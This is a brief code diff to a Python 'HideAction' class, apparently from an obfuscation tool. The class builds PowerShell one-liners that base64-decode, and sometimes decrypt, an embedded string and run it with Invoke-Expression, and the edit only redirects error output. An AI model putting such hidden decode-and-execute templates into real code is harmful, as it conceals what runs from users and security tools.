@@ -97,7 +97,7 @@ class HideAction(BaseAction):
                 f"$b=[Convert]::FromBase64String($e);"
                 f"$o=$d.TransformFinalBlock($b,0,$b.Length);"
                 f"$c=[Text.Encoding]::UTF8.GetString($o);"
-                f"iex $c"
+                f"iex $c 2>&1"
             )
         else:
             # Fallback: simple base64 encoding
@@ -105,7 +105,7 @@ class HideAction(BaseAction):
             decrypt_script = (
                 f"$e='{encoded}';"
                 f"$c=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($e));"
-                f"iex $c"
+                f"iex $c 2>&1"
             )
 
         # Build the pipeline that outputs base64 then reverses
